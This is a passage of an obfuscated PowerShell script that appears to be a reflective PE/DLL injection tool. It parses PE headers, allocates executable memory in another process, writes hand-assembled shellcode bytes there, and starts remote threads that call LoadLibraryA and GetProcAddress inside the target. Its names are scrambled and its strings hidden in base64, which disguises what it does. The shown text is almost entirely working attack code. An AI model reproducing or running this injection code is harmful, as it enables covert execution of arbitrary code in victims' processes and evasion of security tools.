	    if (${_/==\_/\/===\___/}.Signature -ne 0x00004550)
	    {
	        throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAYQBsAGkAZAAgAEkATQBBAEcARQBfAE4AVABfAEgARQBBAEQARQBSACAAcwBpAGcAbgBhAHQAdQByAGUALgA=')))
	    }
		if (${_/==\_/\/===\___/}.OptionalHeader.Magic -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ATgBUAF8ATwBQAFQASQBPAE4AQQBMAF8ASABEAFIANgA0AF8ATQBBAEcASQBDAA=='))))
		{
			${_/=\____/=\/\/\__} | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value ${_/==\_/\/===\___/}
			${_/=\____/=\/\/\__} | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $true
		}
		else
		{
			${/=\/\____/====\/=} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${_/\/\/\_/\_/\/=\_}, [Type]$Win32Types.IMAGE_NT_HEADERS32)
			${_/=\____/=\/\/\__} | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value ${/=\/\____/====\/=}
			${_/=\____/=\/\/\__} | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $false
		}
		return ${_/=\____/=\/\/\__}
	}
	Function _/===\/=\/\_/====\
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true )]
		[Byte[]]
		${__/\/\/\/\/\/\_/\_},
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		${__/\/==\_/\_/\_/\_} = New-Object System.Object
		[IntPtr]${/==\/==\__/=====\} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${__/\/\/\/\/\/\_/\_}.Length)
		[System.Runtime.InteropServices.Marshal]::Copy(${__/\/\/\/\/\/\_/\_}, 0, ${/==\/==\__/=====\}, ${__/\/\/\/\/\/\_/\_}.Length) | Out-Null
		${_/=\____/=\/\/\__} = __/\_/\__/===\/\/= -__/\/=\_/====\_/=\ ${/==\/==\__/=====\} -Win32Types $Win32Types
		${__/\/==\_/\_/\_/\_} | Add-Member -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABFADYANABCAGkAdAA='))) -Value (${_/=\____/=\/\/\__}.PE64Bit)
		${__/\/==\_/\_/\_/\_} | Add-Member -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwByAGkAZwBpAG4AYQBsAEkAbQBhAGcAZQBCAGEAcwBlAA=='))) -Value (${_/=\____/=\/\/\__}.IMAGE_NT_HEADERS.OptionalHeader.ImageBase)
		${__/\/==\_/\_/\_/\_} | Add-Member -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASQBtAGEAZwBlAA=='))) -Value (${_/=\____/=\/\/\__}.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
		${__/\/==\_/\_/\_/\_} | Add-Member -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASABlAGEAZABlAHIAcwA='))) -Value (${_/=\____/=\/\/\__}.IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders)
		${__/\/==\_/\_/\_/\_} | Add-Member -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABsAGwAQwBoAGEAcgBhAGMAdABlAHIAaQBzAHQAaQBjAHMA'))) -Value (${_/=\____/=\/\/\__}.IMAGE_NT_HEADERS.OptionalHeader.DllCharacteristics)
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal(${/==\/==\__/=====\})
		return ${__/\/==\_/\_/\_/\_}
	}
	Function __/==\_/==\__/==\_
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true)]
		[IntPtr]
		${__/\/=\_/====\_/=\},
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Types,
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)
		if (${__/\/=\_/====\_/=\} -eq $null -or ${__/\/=\_/====\_/=\} -eq [IntPtr]::Zero)
		{
			throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABFAEgAYQBuAGQAbABlACAAaQBzACAAbgB1AGwAbAAgAG8AcgAgAEkAbgB0AFAAdAByAC4AWgBlAHIAbwA=')))
		}
		${__/\/==\_/\_/\_/\_} = New-Object System.Object
		${_/=\____/=\/\/\__} = __/\_/\__/===\/\/= -__/\/=\_/====\_/=\ ${__/\/=\_/====\_/=\} -Win32Types $Win32Types
		${__/\/==\_/\_/\_/\_} | Add-Member -MemberType NoteProperty -Name PEHandle -Value ${__/\/=\_/====\_/=\}
		${__/\/==\_/\_/\_/\_} | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value (${_/=\____/=\/\/\__}.IMAGE_NT_HEADERS)
		${__/\/==\_/\_/\_/\_} | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value (${_/=\____/=\/\/\__}.NtHeadersPtr)
		${__/\/==\_/\_/\_/\_} | Add-Member -MemberType NoteProperty -Name PE64Bit -Value (${_/=\____/=\/\/\__}.PE64Bit)
		${__/\/==\_/\_/\_/\_} | Add-Member -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASQBtAGEAZwBlAA=='))) -Value (${_/=\____/=\/\/\__}.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
		if (${__/\/==\_/\_/\_/\_}.PE64Bit -eq $true)
		{
			[IntPtr]${_/\/\___/=\/\/\__} = [IntPtr](____/\/===\__/\/== ([Int64]${__/\/==\_/\_/\_/\_}.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS64)))
			${__/\/==\_/\_/\_/\_} | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value ${_/\/\___/=\/\/\__}
		}
		else
		{
			[IntPtr]${_/\/\___/=\/\/\__} = [IntPtr](____/\/===\__/\/== ([Int64]${__/\/==\_/\_/\_/\_}.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS32)))
			${__/\/==\_/\_/\_/\_} | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value ${_/\/\___/=\/\/\__}
		}
		if ((${_/=\____/=\/\/\__}.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_DLL) -eq $Win32Constants.IMAGE_FILE_DLL)
		{
			${__/\/==\_/\_/\_/\_} | Add-Member -MemberType NoteProperty -Name FileType -Value $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABMAEwA')))
		}
		elseif ((${_/=\____/=\/\/\__}.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE) -eq $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE)
		{
			${__/\/==\_/\_/\_/\_} | Add-Member -MemberType NoteProperty -Name FileType -Value $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBYAEUA')))
		}
		else
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABFACAAZgBpAGwAZQAgAGkAcwAgAG4AbwB0ACAAYQBuACAARQBYAEUAIABvAHIAIABEAEwATAA=')))
		}
		return ${__/\/==\_/\_/\_/\_}
	}
	Function __/===\____/=\_/\_
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		${__/\/=====\/==\___},
		[Parameter(Position=1, Mandatory=$true)]
		[IntPtr]
		${__/======\/\_/\/=\}
		)
		${_/===\/\_/=\_/\_/} = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		${__/\_/=\/\/\___/=} = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi(${__/======\/\_/\/=\})
		${___/===\_/\/=\___} = [UIntPtr][UInt64]([UInt64]${__/\_/=\/\/\___/=}.Length + 1)
		${_/\_/=\/==\/=\/\/} = $Win32Functions.VirtualAllocEx.Invoke(${__/\/=====\/==\___}, [IntPtr]::Zero, ${___/===\_/\/=\___}, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		if (${_/\_/=\/==\/=\/\/} -eq [IntPtr]::Zero)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABhAGwAbABvAGMAYQB0AGUAIABtAGUAbQBvAHIAeQAgAGkAbgAgAHQAaABlACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzAA==')))
		}
		[UIntPtr]${/===\__/\_/\_/\__} = [UIntPtr]::Zero
		${__/==\_/======\/=} = $Win32Functions.WriteProcessMemory.Invoke(${__/\/=====\/==\___}, ${_/\_/=\/==\/=\/\/}, ${__/======\/\_/\/=\}, ${___/===\_/\/=\___}, [Ref]${/===\__/\_/\_/\__})
		if (${__/==\_/======\/=} -eq $false)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIAB3AHIAaQB0AGUAIABEAEwATAAgAHAAYQB0AGgAIAB0AG8AIAByAGUAbQBvAHQAZQAgAHAAcgBvAGMAZQBzAHMAIABtAGUAbQBvAHIAeQA=')))
		}
		if (${___/===\_/\/=\___} -ne ${/===\__/\_/\_/\__})
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAGQAbgAnAHQAIAB3AHIAaQB0AGUAIAB0AGgAZQAgAGUAeABwAGUAYwB0AGUAZAAgAGEAbQBvAHUAbgB0ACAAbwBmACAAYgB5AHQAZQBzACAAdwBoAGUAbgAgAHcAcgBpAHQAaQBuAGcAIABhACAARABMAEwAIABwAGEAdABoACAAdABvACAAbABvAGEAZAAgAHQAbwAgAHQAaABlACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzAA==')))
		}
		${/=\_/\/=\/\_____/} = $Win32Functions.GetModuleHandle.Invoke($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('awBlAHIAbgBlAGwAMwAyAC4AZABsAGwA'))))
		${/=\/====\/==\/\/\} = $Win32Functions.GetProcAddress.Invoke(${/=\_/\/=\/\_____/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGEAZABMAGkAYgByAGEAcgB5AEEA')))) 
		[IntPtr]${__/==\_/===\____/} = [IntPtr]::Zero
		if (${__/\/==\_/\_/\_/\_}.PE64Bit -eq $true)
		{
			${_/==\_/=====\/\/\} = $Win32Functions.VirtualAllocEx.Invoke(${__/\/=====\/==\___}, [IntPtr]::Zero, ${___/===\_/\/=\___}, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			if (${_/==\_/=====\/\/\} -eq [IntPtr]::Zero)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABhAGwAbABvAGMAYQB0AGUAIABtAGUAbQBvAHIAeQAgAGkAbgAgAHQAaABlACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzACAAZgBvAHIAIAB0AGgAZQAgAHIAZQB0AHUAcgBuACAAdgBhAGwAdQBlACAAbwBmACAATABvAGEAZABMAGkAYgByAGEAcgB5AEEA')))
			}
			${_/\/=\__/\__/\/=\} = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			${_/\/=====\_/==\_/} = @(0x48, 0xba)
			${_/==\_/=\__/===\_} = @(0xff, 0xd2, 0x48, 0xba)
			${/=\/==\__/\/==\/\} = @(0x48, 0x89, 0x02, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
			${___/=\__/=\/\_/==} = ${_/\/=\__/\__/\/=\}.Length + ${_/\/=====\_/==\_/}.Length + ${_/==\_/=\__/===\_}.Length + ${/=\/==\__/\/==\/\}.Length + (${_/===\/\_/=\_/\_/} * 3)
			${__/\/\/==\/====\/} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${___/=\__/=\/\_/==})
			${__/\____/\______/} = ${__/\/\/==\/====\/}
			_/=\_/==\__/\/==\/ -___/\/\__/=\_/\_/\ ${_/\/=\__/\__/\/=\} -_/=\/\/===\_/=\__/ ${__/\/\/==\/====\/}
			${__/\/\/==\/====\/} = ____/\/===\__/\/== ${__/\/\/==\/====\/} (${_/\/=\__/\__/\/=\}.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr(${_/\_/=\/==\/=\/\/}, ${__/\/\/==\/====\/}, $false)
			${__/\/\/==\/====\/} = ____/\/===\__/\/== ${__/\/\/==\/====\/} (${_/===\/\_/=\_/\_/})
			_/=\_/==\__/\/==\/ -___/\/\__/=\_/\_/\ ${_/\/=====\_/==\_/} -_/=\/\/===\_/=\__/ ${__/\/\/==\/====\/}
			${__/\/\/==\/====\/} = ____/\/===\__/\/== ${__/\/\/==\/====\/} (${_/\/=====\_/==\_/}.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr(${/=\/====\/==\/\/\}, ${__/\/\/==\/====\/}, $false)
			${__/\/\/==\/====\/} = ____/\/===\__/\/== ${__/\/\/==\/====\/} (${_/===\/\_/=\_/\_/})
			_/=\_/==\__/\/==\/ -___/\/\__/=\_/\_/\ ${_/==\_/=\__/===\_} -_/=\/\/===\_/=\__/ ${__/\/\/==\/====\/}
			${__/\/\/==\/====\/} = ____/\/===\__/\/== ${__/\/\/==\/====\/} (${_/==\_/=\__/===\_}.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr(${_/==\_/=====\/\/\}, ${__/\/\/==\/====\/}, $false)
			${__/\/\/==\/====\/} = ____/\/===\__/\/== ${__/\/\/==\/====\/} (${_/===\/\_/=\_/\_/})
			_/=\_/==\__/\/==\/ -___/\/\__/=\_/\_/\ ${/=\/==\__/\/==\/\} -_/=\/\/===\_/=\__/ ${__/\/\/==\/====\/}
			${__/\/\/==\/====\/} = ____/\/===\__/\/== ${__/\/\/==\/====\/} (${/=\/==\__/\/==\/\}.Length)
			${_/==\/=\/=\/=\/=\} = $Win32Functions.VirtualAllocEx.Invoke(${__/\/=====\/==\___}, [IntPtr]::Zero, [UIntPtr][UInt64]${___/=\__/=\/\_/==}, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			if (${_/==\/=\/=\/=\/=\} -eq [IntPtr]::Zero)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABhAGwAbABvAGMAYQB0AGUAIABtAGUAbQBvAHIAeQAgAGkAbgAgAHQAaABlACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzACAAZgBvAHIAIABzAGgAZQBsAGwAYwBvAGQAZQA=')))
			}
			${__/==\_/======\/=} = $Win32Functions.WriteProcessMemory.Invoke(${__/\/=====\/==\___}, ${_/==\/=\/=\/=\/=\}, ${__/\____/\______/}, [UIntPtr][UInt64]${___/=\__/=\/\_/==}, [Ref]${/===\__/\_/\_/\__})
			if ((${__/==\_/======\/=} -eq $false) -or ([UInt64]${/===\__/\_/\_/\__} -ne [UInt64]${___/=\__/=\/\_/==}))
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIAB3AHIAaQB0AGUAIABzAGgAZQBsAGwAYwBvAGQAZQAgAHQAbwAgAHIAZQBtAG8AdABlACAAcAByAG8AYwBlAHMAcwAgAG0AZQBtAG8AcgB5AC4A')))
			}
			${/=\_/=\/=\__/\___} = _/==\__/=\/\_____/ -_/==\/=\_/\_/==\__ ${__/\/=====\/==\___} -__/\_/====\_/====\ ${_/==\/=\/=\/=\/=\} -Win32Functions $Win32Functions
			${/==\/\___/\__/\__} = $Win32Functions.WaitForSingleObject.Invoke(${/=\_/=\/=\__/\___}, 20000)
			if (${/==\/\___/\__/\__} -ne 0)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAEMAcgBlAGEAdABlAFIAZQBtAG8AdABlAFQAaAByAGUAYQBkACAAdABvACAAYwBhAGwAbAAgAEcAZQB0AFAAcgBvAGMAQQBkAGQAcgBlAHMAcwAgAGYAYQBpAGwAZQBkAC4A')))
			}
			[IntPtr]${_/=\/\_/====\_/\_} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${_/===\/\_/=\_/\_/})
			${/==\/\___/\__/\__} = $Win32Functions.ReadProcessMemory.Invoke(${__/\/=====\/==\___}, ${_/==\_/=====\/\/\}, ${_/=\/\_/====\_/\_}, [UIntPtr][UInt64]${_/===\/\_/=\_/\_/}, [Ref]${/===\__/\_/\_/\__})
			if (${/==\/\___/\__/\__} -eq $false)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAFIAZQBhAGQAUAByAG8AYwBlAHMAcwBNAGUAbQBvAHIAeQAgAGYAYQBpAGwAZQBkAA==')))
			}
			[IntPtr]${__/==\_/===\____/} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${_/=\/\_/====\_/\_}, [Type][IntPtr])
			$Win32Functions.VirtualFreeEx.Invoke(${__/\/=====\/==\___}, ${_/==\_/=====\/\/\}, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
			$Win32Functions.VirtualFreeEx.Invoke(${__/\/=====\/==\___}, ${_/==\/=\/=\/=\/=\}, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		}
		else
		{
			[IntPtr]${/=\_/=\/=\__/\___} = _/==\__/=\/\_____/ -_/==\/=\_/\_/==\__ ${__/\/=====\/==\___} -__/\_/====\_/====\ ${/=\/====\/==\/\/\} -_/==\/=\/=\/=\/=\_ ${_/\_/=\/==\/=\/\/} -Win32Functions $Win32Functions
			${/==\/\___/\__/\__} = $Win32Functions.WaitForSingleObject.Invoke(${/=\_/=\/=\__/\___}, 20000)
			if (${/==\/\___/\__/\__} -ne 0)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAEMAcgBlAGEAdABlAFIAZQBtAG8AdABlAFQAaAByAGUAYQBkACAAdABvACAAYwBhAGwAbAAgAEcAZQB0AFAAcgBvAGMAQQBkAGQAcgBlAHMAcwAgAGYAYQBpAGwAZQBkAC4A')))
			}
			[Int32]${_/=====\_/\____/=} = 0
			${/==\/\___/\__/\__} = $Win32Functions.GetExitCodeThread.Invoke(${/=\_/=\/=\__/\___}, [Ref]${_/=====\_/\____/=})
			if ((${/==\/\___/\__/\__} -eq 0) -or (${_/=====\_/\____/=} -eq 0))
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAEcAZQB0AEUAeABpAHQAQwBvAGQAZQBUAGgAcgBlAGEAZAAgAGYAYQBpAGwAZQBkAA==')))
			}
			[IntPtr]${__/==\_/===\____/} = [IntPtr]${_/=====\_/\____/=}
		}
		$Win32Functions.VirtualFreeEx.Invoke(${__/\/=====\/==\___}, ${_/\_/=\/==\/=\/\/}, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		return ${__/==\_/===\____/}
	}
	Function __/==\_____/\/\__/
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		${__/\/=====\/==\___},
		[Parameter(Position=1, Mandatory=$true)]
		[IntPtr]
		${_/=\/\_/\___/===\_},
		[Parameter(Position=2, Mandatory=$true)]
		[IntPtr]
		${__/\_/==\__/\/===\},
        [Parameter(Position=3, Mandatory=$true)]
        [Bool]
        ${_/===\/===\__/==\/}
		)
		${_/===\/\_/=\_/\_/} = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		[IntPtr]${_/\____/\_/\___/\} = [IntPtr]::Zero   
        if (-not ${_/===\/===\__/==\/})
        {
        	${_/==\/==\____/==\_} = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi(${__/\_/==\__/\/===\})
		    ${___/==\/=\____/=\} = [UIntPtr][UInt64]([UInt64]${_/==\/==\____/==\_}.Length + 1)
		    ${_/\____/\_/\___/\} = $Win32Functions.VirtualAllocEx.Invoke(${__/\/=====\/==\___}, [IntPtr]::Zero, ${___/==\/=\____/=\}, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		    if (${_/\____/\_/\___/\} -eq [IntPtr]::Zero)
		    {
			    Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABhAGwAbABvAGMAYQB0AGUAIABtAGUAbQBvAHIAeQAgAGkAbgAgAHQAaABlACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzAA==')))
		    }
		    [UIntPtr]${/===\__/\_/\_/\__} = [UIntPtr]::Zero
		    ${__/==\_/======\/=} = $Win32Functions.WriteProcessMemory.Invoke(${__/\/=====\/==\___}, ${_/\____/\_/\___/\}, ${__/\_/==\__/\/===\}, ${___/==\/=\____/=\}, [Ref]${/===\__/\_/\_/\__})
		    if (${__/==\_/======\/=} -eq $false)
		    {
			    Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIAB3AHIAaQB0AGUAIABEAEwATAAgAHAAYQB0AGgAIAB0AG8AIAByAGUAbQBvAHQAZQAgAHAAcgBvAGMAZQBzAHMAIABtAGUAbQBvAHIAeQA=')))
		    }
		    if (${___/==\/=\____/=\} -ne ${/===\__/\_/\_/\__})
		    {
			    Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAGQAbgAnAHQAIAB3AHIAaQB0AGUAIAB0AGgAZQAgAGUAeABwAGUAYwB0AGUAZAAgAGEAbQBvAHUAbgB0ACAAbwBmACAAYgB5AHQAZQBzACAAdwBoAGUAbgAgAHcAcgBpAHQAaQBuAGcAIABhACAARABMAEwAIABwAGEAdABoACAAdABvACAAbABvAGEAZAAgAHQAbwAgAHQAaABlACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzAA==')))
		    }
        }
        else
        {
            ${_/\____/\_/\___/\} = ${__/\_/==\__/\/===\}
        }
		${/=\_/\/=\/\_____/} = $Win32Functions.GetModuleHandle.Invoke($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('awBlAHIAbgBlAGwAMwAyAC4AZABsAGwA'))))
		${__/\_____/=\/===\} = $Win32Functions.GetProcAddress.Invoke(${/=\_/\/=\/\_____/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAUAByAG8AYwBBAGQAZAByAGUAcwBzAA==')))) 
		${__/\/=\__/==\__/=} = $Win32Functions.VirtualAllocEx.Invoke(${__/\/=====\/==\___}, [IntPtr]::Zero, [UInt64][UInt64]${_/===\/\_/=\_/\_/}, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		if (${__/\/=\__/==\__/=} -eq [IntPtr]::Zero)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABhAGwAbABvAGMAYQB0AGUAIABtAGUAbQBvAHIAeQAgAGkAbgAgAHQAaABlACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzACAAZgBvAHIAIAB0AGgAZQAgAHIAZQB0AHUAcgBuACAAdgBhAGwAdQBlACAAbwBmACAARwBlAHQAUAByAG8AYwBBAGQAZAByAGUAcwBzAA==')))
		}
		[Byte[]]${/=\/\/=\/====\_/\} = @()
		if (${__/\/==\_/\_/\_/\_}.PE64Bit -eq $true)
		{
			${__/\___/\_/\_/=\/} = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			${_/\_/=\/\__/\/=\_} = @(0x48, 0xba)
			${_/==\__/====\/=\/} = @(0x48, 0xb8)
			${/======\/\__/\/==} = @(0xff, 0xd0, 0x48, 0xb9)
			${/==\___/=\/=\/=\_} = @(0x48, 0x89, 0x01, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
		}
		else
		{
			${__/\___/\_/\_/=\/} = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xc0, 0xb8)
			${_/\_/=\/\__/\/=\_} = @(0xb9)
			${_/==\__/====\/=\/} = @(0x51, 0x50, 0xb8)
			${/======\/\__/\/==} = @(0xff, 0xd0, 0xb9)
			${/==\___/=\/=\/=\_} = @(0x89, 0x01, 0x89, 0xdc, 0x5b, 0xc3)
		}
		${___/=\__/=\/\_/==} = ${__/\___/\_/\_/=\/}.Length + ${_/\_/=\/\__/\/=\_}.Length + ${_/==\__/====\/=\/}.Length + ${/======\/\__/\/==}.Length + ${/==\___/=\/=\/=\_}.Length + (${_/===\/\_/=\_/\_/} * 4)
		${__/\/\/==\/====\/} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${___/=\__/=\/\_/==})
		${__/\____/\______/} = ${__/\/\/==\/====\/}
		_/=\_/==\__/\/==\/ -___/\/\__/=\_/\_/\ ${__/\___/\_/\_/=\/} -_/=\/\/===\_/=\__/ ${__/\/\/==\/====\/}
		${__/\/\/==\/====\/} = ____/\/===\__/\/== ${__/\/\/==\/====\/} (${__/\___/\_/\_/=\/}.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr(${_/=\/\_/\___/===\_}, ${__/\/\/==\/====\/}, $false)
		${__/\/\/==\/====\/} = ____/\/===\__/\/== ${__/\/\/==\/====\/} (${_/===\/\_/=\_/\_/})
		_/=\_/==\__/\/==\/ -___/\/\__/=\_/\_/\ ${_/\_/=\/\__/\/=\_} -_/=\/\/===\_/=\__/ ${__/\/\/==\/====\/}
		${__/\/\/==\/====\/} = ____/\/===\__/\/== ${__/\/\/==\/====\/} (${_/\_/=\/\__/\/=\_}.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr(${_/\____/\_/\___/\}, ${__/\/\/==\/====\/}, $false)
		${__/\/\/==\/====\/} = ____/\/===\__/\/== ${__/\/\/==\/====\/} (${_/===\/\_/=\_/\_/})
		_/=\_/==\__/\/==\/ -___/\/\__/=\_/\_/\ ${_/==\__/====\/=\/} -_/=\/\/===\_/=\__/ ${__/\/\/==\/====\/}
		${__/\/\/==\/====\/} = ____/\/===\__/\/== ${__/\/\/==\/====\/} (${_/==\__/====\/=\/}.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr(${__/\_____/=\/===\}, ${__/\/\/==\/====\/}, $false)
		${__/\/\/==\/====\/} = ____/\/===\__/\/== ${__/\/\/==\/====\/} (${_/===\/\_/=\_/\_/})
		_/=\_/==\__/\/==\/ -___/\/\__/=\_/\_/\ ${/======\/\__/\/==} -_/=\/\/===\_/=\__/ ${__/\/\/==\/====\/}
		${__/\/\/==\/====\/} = ____/\/===\__/\/== ${__/\/\/==\/====\/} (${/======\/\__/\/==}.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr(${__/\/=\__/==\__/=}, ${__/\/\/==\/====\/}, $false)
		${__/\/\/==\/====\/} = ____/\/===\__/\/== ${__/\/\/==\/====\/} (${_/===\/\_/=\_/\_/})
		_/=\_/==\__/\/==\/ -___/\/\__/=\_/\_/\ ${/==\___/=\/=\/=\_} -_/=\/\/===\_/=\__/ ${__/\/\/==\/====\/}
		${__/\/\/==\/====\/} = ____/\/===\__/\/== ${__/\/\/==\/====\/} (${/==\___/=\/=\/=\_}.Length)
		${_/==\/=\/=\/=\/=\} = $Win32Functions.VirtualAllocEx.Invoke(${__/\/=====\/==\___}, [IntPtr]::Zero, [UIntPtr][UInt64]${___/=\__/=\/\_/==}, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
		if (${_/==\/=\/=\/=\/=\} -eq [IntPtr]::Zero)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABhAGwAbABvAGMAYQB0AGUAIABtAGUAbQBvAHIAeQAgAGkAbgAgAHQAaABlACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzACAAZgBvAHIAIABzAGgAZQBsAGwAYwBvAGQAZQA=')))
		}
		[UIntPtr]${/===\__/\_/\_/\__} = [UIntPtr]::Zero
		${__/==\_/======\/=} = $Win32Functions.WriteProcessMemory.Invoke(${__/\/=====\/==\___}, ${_/==\/=\/=\/=\/=\}, ${__/\____/\______/}, [UIntPtr][UInt64]${___/=\__/=\/\_/==}, [Ref]${/===\__/\_/\_/\__})
		if ((${__/==\_/======\/=} -eq $false) -or ([UInt64]${/===\__/\_/\_/\__} -ne [UInt64]${___/=\__/=\/\_/==}))
		{
